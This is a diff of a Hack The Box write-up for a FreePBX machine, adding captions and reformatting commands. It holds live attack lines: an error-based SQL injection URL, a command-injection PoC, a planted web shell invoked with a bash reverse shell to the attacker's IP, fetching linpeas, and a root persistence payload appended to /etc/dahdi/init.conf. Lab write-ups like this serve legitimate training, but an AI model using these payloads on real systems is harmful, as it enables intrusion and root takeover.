@@ -40,6 +40,7 @@ order: 1
     - ![image](./img-05.png)
 - Lets `cat 52031.php`:
     - ![image](./img-06.png)
+      <span class="caption">The PoC posts to `/admin/ajax.php?module=api&command=generatedocs` with a `$(bash -i …)` reverse shell hidden in the `host` value, and it needs a valid `PHPSESSID`, which is exactly the part we don't have.</span>
     - See that it only needs `any valid session even extension` so let's try using the cookie straight up
     - However, let's first understand what this is doing: Send a POST req to FreePBX's REST API module, and this `scopes=rest&host=http://<ip>/$(bash -1 >& /dev/tcp/<ip>/4444 0>&1)` is the star of the atk, see that when `generatedocs` generates the docs, it takes `host` value and executes the shell command behind WITHOUT sanitizing it. What it runs is a reverse shell, so we would later want to do `nc -lvnp 4444` and let the script run to gain shell access.
 - Let's fill in the variables, note that `$url` needs the `connected.htb` and not the straight up IP, and `$backconnectip` needs our own vpn ip, so we can do `ifconfig` to check for `tun0` ip
@@ -53,6 +54,7 @@ order: 1
 - We try to check if err-based SQLi works:
     - Go to `"https://connected.htb/admin/ajax.php?module=FreePBX\\modules\\endpoint\\ajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT USER()),'~'))--+"`
     - ![image](./img-08.png)
+      <span class="caption">The `EXTRACTVALUE` payload makes MySQL throw an XPATH error that echoes our query back: `~freepbxuser@localhost~`. Seeing the `USER()` result inside the error confirms error-based SQL injection.</span>
     - See that it leaks info of the db, so it may work here
 - Let's guess the `cron_jobs` column exists, so we try to inject a malicious payload inside that
 ```bash
@@ -68,6 +70,7 @@ curl -ik -G "https://connected.htb/admin/ajax.php" \
     - Do `curl -k "https://connected.htb/wt-shell3.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/[tun0 ip]/4444 0>&1'" -G`
     - And see we are in.
     - ![image](./img-09.png)
+      <span class="caption">Left: the first request 404s because the cron job hadn't run yet; a minute later the same request hits `wt-shell3.php`. Right: the listener catches a shell from 10.129.11.18, and the FreePBX banner confirms we're on the box.</span>
 - This will give us the user flag by:
     - ![image](./img-10.png)
 
@@ -79,10 +82,15 @@ curl -ik -G "https://connected.htb/admin/ajax.php" \
 - Especially now we see that the incron daemon runs as root, so anything it launches runs as root (thus maybe we can inject a reverse shell init and let it run?)
 - But these are all too complex, let's just use linpeas.sh
     - Because HTB boxes mostly does not have internet, so we navigate on our machine to where linpeas.sh is and start `python3 -m http.server 8000` to allow the HTB box to get linpeas.sh from us
-    - Then on the HTB machine we do `cd /tmp`
-`curl -o linpeas.sh http://<your-tun0-ip>:8000/linpeas.sh`
-`chmod +x linpeas.sh`
-`./linpeas.sh | tee /tmp/lp.txt`
+    - Then on the HTB machine we do:
+
+      ```bash
+      cd /tmp
+      curl -o linpeas.sh http://<your-tun0-ip>:8000/linpeas.sh
+      chmod +x linpeas.sh
+      ./linpeas.sh | tee /tmp/lp.txt
+      ```
+
 - There is so much! 功力不足哀哀哀看不懂哪個可以用來提權 只好看write up 了
 - After enumeration we see that `/etc/dahdi/init.conf` can be modified but we shouldnt be able to because it executes the cmds in it as root
     - Thus we inject a rev shell payload `echo 'bash -c "bash -i >& /dev/tcp/YOUR_IP/4445 0>&1" &' >> /etc/dahdi/init.conf`
